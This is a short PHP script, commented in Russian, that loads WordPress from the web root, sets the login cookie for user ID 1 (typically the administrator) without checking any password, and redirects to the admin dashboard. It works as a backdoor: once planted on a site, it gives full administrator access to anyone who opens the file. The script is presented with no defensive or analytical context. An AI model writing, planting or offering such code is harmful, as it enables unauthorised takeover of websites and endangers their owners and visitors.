<?php

$mr = $_SERVER['DOCUMENT_ROOT'];

@chdir($mr);

if (file_exists('wp-load.php')) {
    include 'wp-load.php';

    // Укажите ID пользователя, под которым нужно авторизоваться
    $user_id = 1; // Замените 1 на ID нужного пользователя

    // Проверяем, существует ли пользователь с указанным ID
    $user = get_userdata($user_id);

    if ($user) {
        // Устанавливаем cookie для авторизации
        wp_set_auth_cookie($user_id);

        // Перенаправляем в админку
        wp_redirect(admin_url());
        die();
    } else {
        die('Ошибка: Пользователь с указанным ID не найден.');
    }
} else {
    die('Failed to load');
}

?>
